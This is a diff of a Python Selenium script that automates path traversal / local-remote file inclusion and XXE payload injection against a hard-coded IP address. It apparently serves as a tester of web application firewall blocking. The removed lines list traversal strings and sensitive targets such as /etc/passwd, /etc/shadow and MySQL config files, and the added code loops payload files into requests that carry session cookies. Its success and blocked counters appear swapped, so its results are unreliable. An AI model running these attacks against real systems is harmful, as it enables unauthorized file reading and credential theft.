@@ -1,70 +1,63 @@
-"""
-
-Module Broken Auth.
-Urls: http://34.192.19.10/directory_traversal_2.php?directory=documents
-http://34.192.19.10/directory_traversal_1.php?page=message.txt
-
-"""
-
 from main import init
-from selenium.webdriver.common.keys import Keys
 import time
-from selenium import webdriver
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.common.exceptions import TimeoutException
+from selenium.common.exceptions import NoSuchElementException
 import requests
+from utility import get_cookie_from_driver, calculate_file_lines
 
-PATH = "C:\Program Files (x86)\chromedriver.exe"
+"""
 
-driver = init()[0]
-target_url = 'http://34.192.19.10/directory_traversal_2.php?directory=documents'
-driver.get(target_url)
+"""
+def execute(driver, target_url):
+    # Start to attack
+    lfi_rfi_attack(driver, target_url)
+
+def lfi_rfi_attack(driver, target_url):
+
+    payload_path = './Payloads/LFI_RFI_Injections.txt'
+
+    # Adjust URL Injection Speed if needed, Lower is quicker
+    injection_speed = 1
+
+    # Calculate Amount Of PayLoads
+    lines = calculate_file_lines(payload_path)
+    blocked_by_waf_counter = 0
 
 
-def lfi_rfi_attack():
+    # Getting Payloads and starting to inject into WAF
+    with open(payload_path, 'r', encoding='utf-8') as lfi_payloads:
 
-    directory_traversal_list = [
-        '../',
-        '../../',
-        '../../../',
-        '../../../etc/',
-        '..\/',
-        '%252e%252e%252f',
-        '%c0%ae%c0%ae%c0%af',
-    ]
+        for payload in lfi_payloads:
+            attack_url_page = target_url + f'directory_traversal_2.php?directory={payload}'
+            time.sleep(injection_speed)
+            driver.get(attack_url_page)
+            try:
+                # Catch WAF Blocking page
+                waf_block_message = driver.find_element_by_xpath("/html/body/center/h1").text
+                if "403 Forbidden" == waf_block_message:
+                    blocked_by_waf_counter += 1
+            except NoSuchElementException:
+                print('[+] Path Traversal Attack passed: ', payload.strip())
 
-    file_list = [
-        'c:\windows\system32\license.rtf',
-        'c:\windows\system32\eula.txt',
-        '/etc/issue',
-        '../../../etc/passwd',
-        '../../../etc/shadow',
-        '../../../etc/group',
-        '../../../etc/hosts',
-        '../../../etc/motd',
-        '../../../etc/mysql/my.cnf',
-        '../var/log/',
-    ]
+    # for file in file_list:
+    #     attack_url_page = target_url + f'directory_traversal_1.php?page={file}'
+    #     driver.get(attack_url_page)
+    #     try:
+    #         # Catch WAF Blocking page
+    #         waf_block_message = driver.find_element_by_xpath("/html/body/center/h1").text
+    #         if "403 Forbidden" == waf_block_message:
+    #             blocked_by_waf_counter += 1
+    #     except NoSuchElementException:
+    #         print('[+] Path Traversal Attack passed: ', file)
 
-    for directory_traversal in directory_traversal_list:
-        # print(path)
-        target_url = f'http://34.192.19.10/directory_traversal_2.php?directory={directory_traversal}'
-        driver.get(target_url)
-        if target_url == driver.current_url:
-            print('[ + ] Path Traversal Attack passed: ', directory_traversal)
-        # html = driver.find_element_by_id('main').text
-        # print(html)
-        time.sleep(3)
+        time.sleep(injection_speed)
+        print(f"\n[!] ~~~Local File Inclusion / Remote File Inclusion [LFI / RFI] Results~~~ [!]")
+        print('Attacks Blocked by WAF: ', lines - blocked_by_waf_counter)
+        print(f"[+] Total Successful Attacks: ", blocked_by_waf_counter)
 
-    for file in file_list:
-        target_url = f'http://34.192.19.10/directory_traversal_1.php?page={file}'
-        driver.get(target_url)
-        if target_url == driver.current_url:
-            print('[ + ] Path Traversal Attack passed: ', file)
-        # html = driver.find_element_by_id('main').text
-        # print(html)
-        time.sleep(3)
+    driver.quit()
 
 def ssrf_attack():
     """
@@ -98,14 +91,13 @@ def xxe_attack():
     driver.get(target_url)
 
     time.sleep(5)  # Wait Cookies To load
-    driver_cookies = driver.get_cookies()
-    c = {c['name']: c['value'] for c in driver_cookies}
+    driver_cookies = get_cookie_from_driver(driver)
 
     with open('Payloads/XXE_Payloads.txt', 'r', encoding='utf-8') as xxe_payloads:
         payloads = xxe_payloads.read().split('\n\n')
 
         for payload in payloads:
-            res = requests.post('http://34.192.19.10/xxe-2.php', cookies=c, data=payload)
+            res = requests.post('http://34.192.19.10/xxe-2.php', cookies=driver_cookies, data=payload)
             if res.text.split('\n')[-1] == 'An error occured!':
                 print('[+] XXE Attack Passed: ', payload)
 
@@ -114,4 +106,4 @@ def xxe_attack():
         #     print(row)
     driver.quit()
 # lfi_rfi_attack()
-xxe_attack()
+# xxe_attack()
